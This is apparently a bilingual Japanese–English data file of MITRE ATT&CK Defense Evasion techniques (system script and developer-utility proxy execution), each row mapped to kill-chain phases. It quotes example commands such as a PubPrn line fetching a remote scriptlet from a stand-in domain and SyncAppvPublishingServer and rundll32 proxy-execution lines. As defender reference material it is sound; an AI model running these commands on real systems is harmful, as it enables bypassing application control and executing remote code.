防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1216,システムスクリプトプロキシ実行,System Script Proxy Execution,攻撃者は、証明書で署名されていることが多い信頼できるスクリプトを使用して、悪意のあるファイルの実行をプロキシする可能性があります。Microsoftからダウンロードされた、またはWindowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名スクリプトは、他のファイルの実行をプロキシするために使用できます。(引用: LOLBAS Project) この動作は、システム上のアプリケーション制御と署名検証をバイパスする可能性のある悪意のあるファイルを実行するために、攻撃者によって悪用される可能性があります。(引用: GitHub Ultimate AppLocker Bypass List),"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",T1216.001,PubPrn,PubPrn,"攻撃者はPubPrnを使用して、悪意のあるリモートファイルの実行をプロキシする可能性があります。PubPrn.vbsは、プリンターをActive Directoryドメインサービスに公開する[Visual Basic](https://attack.mitre.org/techniques/T1059/005)スクリプトです。このスクリプトはMicrosoftによって署名されている可能性があり、通常、<code>Cscript.exe</code>を介して[Windowsコマンドシェル](https://attack.mitre.org/techniques/T1059/003)経由で実行されます。例えば、次のコードは指定されたドメイン内にプリンターを公開します：<code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>。(引用: pubprn)

攻撃者はPubPrnを悪用して、リモートサイトでホストされている悪意のあるペイロードを実行する可能性があります。(引用: Enigma0x3 PubPrn Bypass) そうするために、攻撃者は2番目の<code>script:</code>パラメータを、リモートサイトでホストされているスクリプトレットファイル（.sct）を参照するように設定する可能性があります。コマンドの例は<code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>です。この動作は、このスクリプトの悪用を考慮していない署名検証制限およびアプリケーション制御ソリューションをバイパスする可能性があります。

Windowsの新しいバージョン（10以降）では、<code>PubPrn.vbs</code>はリモートサイトからのプロキシ実行を防ぐように更新されています。これは、2番目のパラメータで指定されるプロトコルを、HTTP(S)経由でリモートコードを参照するために使用できる<code>script:</code>モニカではなく、<code>LDAP://</code>に制限することによって行われます。","Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1216,システムスクリプトプロキシ実行,System Script Proxy Execution,攻撃者は、証明書で署名されていることが多い信頼できるスクリプトを使用して、悪意のあるファイルの実行をプロキシする可能性があります。Microsoftからダウンロードされた、またはWindowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名スクリプトは、他のファイルの実行をプロキシするために使用できます。(引用: LOLBAS Project) この動作は、システム上のアプリケーション制御と署名検証をバイパスする可能性のある悪意のあるファイルを実行するために、攻撃者によって悪用される可能性があります。(引用: GitHub Ultimate AppLocker Bypass List),"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",T1216.002,SyncAppvPublishingServer,SyncAppvPublishingServer,"攻撃者はSyncAppvPublishingServer.vbsを悪用して、悪意のある[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドの実行をプロキシする可能性があります。SyncAppvPublishingServer.vbsは、Windowsがアプリケーションを仮想化する方法（Microsoft Application Virtualization、またはApp-V）に関連付けられたVisual Basicスクリプトです。(引用: 1 - appv) 例えば、WindowsはWin32アプリケーションを仮想アプリケーションとしてユーザーにレンダリングし、ユーザーがローカルにインストールされているかのように起動して対話できるようにします。(引用: 2 - appv)(引用: 3 - appv)

SyncAppvPublishingServer.vbsスクリプトは正当なものであり、Microsoftによって署名されている可能性があり、通常、<code>wscript.exe</code>を介してコマンドライン経由で<code>\\System32</code>から実行されます。(引用: 4 - appv)(引用: 5 - appv)

敵対者は、SyncAppvPublishingServer.vbsを悪用して[PowerShell](https://attack.mitre.org/techniques/T1059/001)の実行制限を回避し、「Living Off the Land」によって防御的対抗策を回避するかもしれない。(引用：6 - appv）（引用：4 - appv）プロキシ実行は、`powershell.exe`を直接呼び出す代わりの、信頼できる/署名済みの代替手段として機能するかもしれない。(引用：7 - appv）

例えば、[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドは、次のようにして呼び出すことができます：（引用：5 - appv）

<code>SyncAppvPublishingServer.vbs \""n; {PowerShell}\""</code>","Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)

The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)

Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by \""living off the land.\""(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)

For example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)

`SyncAppvPublishingServer.vbs \""n; {PowerShell}\""`",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1211,防御回避のための悪用,Exploitation for Defense Evasion,"攻撃者は、セキュリティ機能をバイパスするために、システムまたはアプリケーションの脆弱性を悪用する可能性があります。脆弱性の悪用は、攻撃者がプログラム、サービス、またはオペレーティングシステムのソフトウェアやカーネル自体のプログラミングエラーを利用して、攻撃者が制御するコードを実行する場合に発生します。防御的なセキュリティソフトウェアには、それらを無効にしたり回避したりするために使用できる脆弱性が存在する可能性があります。

敵対者は、偵察によって環境内にセキュリティソフトウェアが存在することを事前に知っているか、システムが侵害された際またはその直後に[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1518/001)のチェックを行う可能性がある。セキュリティソフトウェアは、おそらく直接悪用の標的となるだろう。永続的な脅威グループが検出を回避するためにウイルス対策ソフトウェアを標的とした例がある。

SaaSアプリケーションのパブリッククラウドインフラストラクチャに、防御境界をバイパスしたり(引用：Salesforce zero-day in facebook phishing attack)、セキュリティログを回避したり(引用：Bypassing CloudTrail in AWS Service Catalog)、隠されたインフラストラクチャをデプロイしたり(引用：GhostToken GCP flaw)する可能性のある脆弱性の例も存在する。","Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.

Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.

There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1127,信頼できる開発者ユーティリティプロキシ実行,Trusted Developer Utilities Proxy Execution,"攻撃者は、信頼できる開発者ユーティリティを利用して、悪意のあるペイロードの実行をプロキシする可能性があります。ソフトウェア開発関連のタスクに使用される多くのユーティリティがあり、これらは開発、デバッグ、リバースエンジニアリングを支援するためにさまざまな形式でコードを実行できます。(引用: engima0x3 DNX Bypass)(引用: engima0x3 RCSI Bypass)(引用: Exploit Monday WinDbg)(引用: LOLBAS Tracker) これらのユーティリティは、多くの場合、システム上で実行でき、信頼できるプロセスを介して悪意のあるコードの実行をプロキシし、アプリケーション制御ソリューションを効果的にバイパスできる正当な証明書で署名されています。

Smart App Controlは、実行前にMicrosoftクラウドサービスからの既知の安全なリストに対して未署名のアプリケーションを検証することにより、潜在的に悪意のあると見なされるアプリケーションの実行をブロックするWindowsの機能です。(引用: Microsoft Smart App Control) しかし、攻撃者は、任意のコードの実行をサポートする安全で署名済みのアプリケーションに対するオペレーティングシステムの信頼を悪用する「評判ハイジャック」を利用する可能性があります。[信頼できる開発者ユーティリティプロキシ実行](https://attack.mitre.org/techniques/T1127)を利用して悪意のあるコードを実行することにより、攻撃者はSmart App Control保護をバイパスする可能性があります。(引用: Elastic Security Labs)","Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.

Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.(Citation: Microsoft Smart App Control) However, adversaries may leverage \""reputation hijacking\"" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveraging [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run their malicious code, adversaries may bypass Smart App Control protections.(Citation: Elastic Security Labs)",T1127.001,MSBuild,MSBuild,"攻撃者はMSBuildを使用して、信頼できるWindowsユーティリティを介してコードの実行をプロキシする可能性があります。MSBuild.exe（Microsoft Build Engine）は、Visual Studioで使用されるソフトウェアビルドプラットフォームです。さまざまなプラットフォームと構成をロードおよびビルドするための要件を定義するXML形式のプロジェクトファイルを処理します。(引用: MSDN MSBuild)

攻撃者はMSBuildを悪用して悪意のあるコードの実行をプロキシする可能性があります。.NETバージョン4で導入されたMSBuildのインラインタスク機能により、C#またはVisual BasicコードをXMLプロジェクトファイルに挿入できます。(引用: MSDN MSBuild)(引用: Microsoft MSBuild Inline Tasks 2017) MSBuildはインラインタスクをコンパイルして実行します。MSBuild.exeは署名済みのMicrosoftバイナリであるため、このように使用すると任意のコードを実行でき、MSBuild.exeの実行を許可するように構成されているアプリケーション制御防御をバイパスできます。(引用: LOLBAS Msbuild)","Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)

Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1127,信頼できる開発者ユーティリティプロキシ実行,Trusted Developer Utilities Proxy Execution,"攻撃者は、信頼できる開発者ユーティリティを利用して、悪意のあるペイロードの実行をプロキシする可能性があります。ソフトウェア開発関連のタスクに使用される多くのユーティリティがあり、これらは開発、デバッグ、リバースエンジニアリングを支援するためにさまざまな形式でコードを実行できます。(引用: engima0x3 DNX Bypass)(引用: engima0x3 RCSI Bypass)(引用: Exploit Monday WinDbg)(引用: LOLBAS Tracker) これらのユーティリティは、多くの場合、システム上で実行でき、信頼できるプロセスを介して悪意のあるコードの実行をプロキシし、アプリケーション制御ソリューションを効果的にバイパスできる正当な証明書で署名されています。

Smart App Controlは、実行前にMicrosoftクラウドサービスからの既知の安全なリストに対して未署名のアプリケーションを検証することにより、潜在的に悪意のあると見なされるアプリケーションの実行をブロックするWindowsの機能です。(引用: Microsoft Smart App Control) しかし、攻撃者は、任意のコードの実行をサポートする安全で署名済みのアプリケーションに対するオペレーティングシステムの信頼を悪用する「評判ハイジャック」を利用する可能性があります。[信頼できる開発者ユーティリティプロキシ実行](https://attack.mitre.org/techniques/T1127)を利用して悪意のあるコードを実行することにより、攻撃者はSmart App Control保護をバイパスする可能性があります。(引用: Elastic Security Labs)","Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.

Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.(Citation: Microsoft Smart App Control) However, adversaries may leverage \""reputation hijacking\"" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveraging [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run their malicious code, adversaries may bypass Smart App Control protections.(Citation: Elastic Security Labs)",T1127.002,ClickOnce,ClickOnce,"攻撃者はClickOnceアプリケーション（.appref-msおよび.applicationファイル）を使用して、信頼できるWindowsユーティリティを介してコードの実行をプロキシする可能性があります。(引用: Burke/CISA ClickOnce BlackHat) ClickOnceは、ユーザーが最小限のユーザー操作でファイル共有またはWebページからインストールして実行する、自己更新型のWindowsベースの.NETアプリケーション（.XBAP、.EXE、または.DLLなど）を作成できるようにする展開です。アプリケーションはDFSVC.EXEの子プロセスとして起動し、DFSVC.EXEはアプリケーションのインストール、起動、および更新を担当します。(引用: SpectorOps Medium ClickOnce)

ClickOnceアプリケーションは限定的な権限しか受け取らないため、インストールに管理者権限は必要ありません。(引用: Microsoft Learn ClickOnce) そのため、攻撃者は権限を昇格させる必要なく、ClickOnceを悪用して悪意のあるコードの実行をプロキシする可能性があります。

ClickOnceはいくつかの方法で悪用される可能性があります。例えば、攻撃者は[ユーザー実行](https://attack.mitre.org/techniques/T1204)に依存する可能性があります。ユーザーが悪意のあるウェブサイトにアクセスすると、.NETマルウェアは正当なソフトウェアになりすまし、ClickOnceポップアップが表示されてインストールされます。(引用: NetSPI ClickOnce)

敵対者はまた、<code>rundll32.exe dfshim.dll,ShOpenVerbApplication1</code>コマンドを使用して、[Rundll32](https://attack.mitre.org/techniques/T1218/011)スクリプトを介してClickOnceを悪用してマルウェアを実行する可能性もある。(引用：LOLBAS /Dfsvc.exe）

さらに、攻撃者はClickOnceアプリケーションファイルをリモートユーザーのスタートアップフォルダに移動して、継続的な悪意のあるコードの展開を行う可能性があります（つまり、[レジストリ実行キー/スタートアップフォルダ](https://attack.mitre.org/techniques/T1547/001)）。(引用: Burke/CISA ClickOnce BlackHat)(引用: Burke/CISA ClickOnce Paper)","Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.(Citation: Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.(Citation: SpectorOps Medium ClickOnce)

Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.(Citation: Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.

ClickOnce may be abused in a number of ways. For example, an adversary may rely on [User Execution](https://attack.mitre.org/techniques/T1204). When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce)

Adversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011) script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation: LOLBAS /Dfsvc.exe)

Additionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation: Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1127,信頼できる開発者ユーティリティプロキシ実行,Trusted Developer Utilities Proxy Execution,"攻撃者は、信頼できる開発者ユーティリティを利用して、悪意のあるペイロードの実行をプロキシする可能性があります。ソフトウェア開発関連のタスクに使用される多くのユーティリティがあり、これらは開発、デバッグ、リバースエンジニアリングを支援するためにさまざまな形式でコードを実行できます。(引用: engima0x3 DNX Bypass)(引用: engima0x3 RCSI Bypass)(引用: Exploit Monday WinDbg)(引用: LOLBAS Tracker) これらのユーティリティは、多くの場合、システム上で実行でき、信頼できるプロセスを介して悪意のあるコードの実行をプロキシし、アプリケーション制御ソリューションを効果的にバイパスできる正当な証明書で署名されています。

Smart App Controlは、実行前にMicrosoftクラウドサービスからの既知の安全なリストに対して未署名のアプリケーションを検証することにより、潜在的に悪意のあると見なされるアプリケーションの実行をブロックするWindowsの機能です。(引用: Microsoft Smart App Control) しかし、攻撃者は、任意のコードの実行をサポートする安全で署名済みのアプリケーションに対するオペレーティングシステムの信頼を悪用する「評判ハイジャック」を利用する可能性があります。[信頼できる開発者ユーティリティプロキシ実行](https://attack.mitre.org/techniques/T1127)を利用して悪意のあるコードを実行することにより、攻撃者はSmart App Control保護をバイパスする可能性があります。(引用: Elastic Security Labs)","Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.

Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.(Citation: Microsoft Smart App Control) However, adversaries may leverage \""reputation hijacking\"" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveraging [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run their malicious code, adversaries may bypass Smart App Control protections.(Citation: Elastic Security Labs)",T1127.003,JamPlus,JamPlus,"攻撃者は`JamPlus`を使用して、悪意のあるスクリプトの実行をプロキシする可能性があります。`JamPlus`は、コードおよびデータビルドシステム用のビルドユーティリティツールです。いくつかの一般的なコンパイラで動作し、Visual Studioなどのコードエディタでワークスペースを生成するために使用できます。(引用: JamPlus manual)

攻撃者は、ビルドプロセスと必要な依存関係を記述する`.jam`ファイルを介して悪意のあるスクリプトを実行するために、`JamPlus`ビルドユーティリティを悪用する可能性があります。悪意のあるスクリプトは評判の良い開発者ツールから実行されるため、Smart App Controlなどのアプリケーション制御セキュリティシステムを破壊する可能性があります。(引用: Cyble)(引用: Elastic Security Labs)","Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)

Adversaries may abuse the `JamPlus` build utility to execute malicious scripts via a `.jam` file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.(Citation: Cyble)(Citation: Elastic Security Labs)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。